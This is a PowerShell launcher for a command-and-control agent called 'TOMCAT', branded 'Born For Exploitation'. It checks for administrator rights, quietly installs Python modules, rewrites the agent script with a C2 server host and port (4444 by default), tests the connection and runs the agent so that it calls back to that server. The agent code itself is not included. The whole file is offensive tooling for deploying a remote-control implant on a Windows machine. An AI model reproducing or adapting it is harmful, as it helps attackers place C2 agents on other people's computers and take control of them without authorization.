# TOMCAT C2 Agent Connector for Windows (PowerShell)
# Author: TOM7

# Configuration
$ServerHost = "127.0.0.1"  # Change this to your C2 server IP
$ServerPort = 4444         # Change this if using different port
$AgentScript = "tomcatv1a.py"

# Colors
function Write-ColorOutput {
    param(
        [string]$Message,
        [string]$Color = "White"
    )
    Write-Host $Message -ForegroundColor $Color
}

# Banner
Clear-Host
Write-ColorOutput @"

    ___________________      _____  _________     ________________ _________  ________
    \__    ___/\_____  \    /     \ \_   ___ \   /  _  \__    ___/ \_   ___ \ \_____  \
      |    |    /   |   \  /  \ /  \/    \  \/  /  /_\  \|    |    /    \  \/  /  ____/
      |    |   /    |    \/    Y    \     \____/    |    \    |    \     \____/       \
      |____|   \_______  /\____|__  /\______  /\____|__  /____|     \______  /\_______ \
                       \/         \/        \/         \/                  \/         \/

"@ -Color Red

Write-ColorOutput "            TOMCAT C2 Agent Connector (PowerShell)" -Color Cyan
Write-ColorOutput "            Author: TOM7 | Born For Exploitation`n" -Color Yellow

# Check if running as Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {
    Write-ColorOutput "[+] Running as ADMINISTRATOR" -Color Yellow
} else {
    Write-ColorOutput "[*] Running as standard user" -Color Blue
}

# Check if Python is installed
Write-ColorOutput "`n[*] Checking Python installation..." -Color Blue
$pythonCmd = $null

# Try different Python commands
$pythonCommands = @("python", "python3", "py")
foreach ($cmd in $pythonCommands) {
    try {
        $version = & $cmd --version 2>&1
        if ($LASTEXITCODE -eq 0) {
            $pythonCmd = $cmd
            Write-ColorOutput "[+] Python found: $version" -Color Green
            break
        }
    } catch {
        continue
    }
}

if (-not $pythonCmd) {
    Write-ColorOutput "[-] Python not found! Please install Python first." -Color Red
    Write-ColorOutput "    Download from: https://www.python.org/downloads/" -Color Yellow
    Read-Host "`nPress Enter to exit"
    exit 1
}

# Check if agent script exists
if (-not (Test-Path $AgentScript)) {
    Write-ColorOutput "`n[-] Agent script not found: $AgentScript" -Color Red
    Write-ColorOutput "[!] Please make sure $AgentScript is in the same directory" -Color Yellow
    Read-Host "`nPress Enter to exit"
    exit 1
}

# Check and install required modules
Write-ColorOutput "`n[*] Checking required Python modules..." -Color Blue

$requiredModules = @("PIL", "cryptography")
$missingModules = @()

foreach ($module in $requiredModules) {
    try {
        & $pythonCmd -c "import $module" 2>$null
        if ($LASTEXITCODE -ne 0) {
            $missingModules += $module
        }
    } catch {
        $missingModules += $module
    }
}

if ($missingModules.Count -gt 0) {
    Write-ColorOutput "[!] Missing modules: $($missingModules -join ', ')" -Color Yellow
    Write-ColorOutput "[*] Installing required modules..." -Color Blue

    # Upgrade pip
    & $pythonCmd -m pip install --upgrade pip --quiet

    # Install missing modules
    if ($missingModules -contains "PIL") {
        Write-ColorOutput "    Installing Pillow..." -Color Cyan
        & $pythonCmd -m pip install pillow --quiet
    }

    if ($missingModules -contains "cryptography") {
        Write-ColorOutput "    Installing cryptography..." -Color Cyan
        & $pythonCmd -m pip install cryptography --quiet
    }

    Write-ColorOutput "[+] Modules installed" -Color Green
} else {
    Write-ColorOutput "[+] All required modules are installed" -Color Green
}

# Update agent script with server details
Write-ColorOutput "`n[*] Configuring agent for $ServerHost`:$ServerPort..." -Color Blue

try {
    # Backup original script
    Copy-Item $AgentScript "$AgentScript.bak" -Force

    # Read and update script
    $content = Get-Content $AgentScript -Raw
    $content = $content -replace 'serverHost = ".*?"', "serverHost = `"$ServerHost`""
    $content = $content -replace "serverHost = '.*?'", "serverHost = '$ServerHost'"
    $content = $content -replace 'serverPort = \d+', "serverPort = $ServerPort"

    # Write back
    Set-Content -Path $AgentScript -Value $content -NoNewline

    Write-ColorOutput "[+] Agent configured" -Color Green
} catch {
    Write-ColorOutput "[-] Failed to configure agent: $_" -Color Red
    Read-Host "`nPress Enter to exit"
    exit 1
}

# Test server connectivity
Write-ColorOutput "`n[*] Testing connection to $ServerHost`:$ServerPort..." -Color Blue

try {
    $tcpClient = New-Object System.Net.Sockets.TcpClient
    $tcpClient.ReceiveTimeout = 3000
    $tcpClient.SendTimeout = 3000

    $connection = $tcpClient.BeginConnect($ServerHost, $ServerPort, $null, $null)
    $success = $connection.AsyncWaitHandle.WaitOne(3000, $false)

    if ($success) {
        $tcpClient.EndConnect($connection)
        $tcpClient.Close()
        Write-ColorOutput "[+] Server is reachable!" -Color Green
    } else {
        $tcpClient.Close()
        throw "Connection timeout"
    }
} catch {
    Write-ColorOutput "[!] WARNING: Cannot reach server at $ServerHost`:$ServerPort" -Color Yellow
    Write-ColorOutput "[!] Make sure the C2 server is running" -Color Yellow

    $continue = Read-Host "`nContinue anyway? (Y/N)"
    if ($continue -ne "Y" -and $continue -ne "y") {
        Write-ColorOutput "[-] Aborted" -Color Red

        # Restore original script
        if (Test-Path "$AgentScript.bak") {
            Move-Item "$AgentScript.bak" $AgentScript -Force
        }
        exit 1
    }
}

# Launch agent
Write-ColorOutput "`n===============================================================================" -Color Cyan
Write-ColorOutput "[*] Launching TOMCAT Agent..." -Color Cyan
Write-ColorOutput "[*] Connecting to $ServerHost`:$ServerPort" -Color Cyan
Write-ColorOutput "[!] Press Ctrl+C to stop" -Color Yellow
Write-ColorOutput "===============================================================================`n" -Color Cyan

Start-Sleep -Seconds 1

# Run agent
try {
    & $pythonCmd $AgentScript
} catch {
    Write-ColorOutput "`n[-] Error running agent: $_" -Color Red
} finally {
    # Cleanup
    Write-ColorOutput "`n[!] Agent stopped" -Color Yellow
    Write-ColorOutput "[*] Cleaning up..." -Color Blue

    # Restore original script
    if (Test-Path "$AgentScript.bak") {
        Move-Item "$AgentScript.bak" $AgentScript -Force
        Write-ColorOutput "[+] Agent script restored" -Color Green
    }

    Write-ColorOutput "[*] Done!" -Color Cyan
}

Read-Host "`nPress Enter to exit"
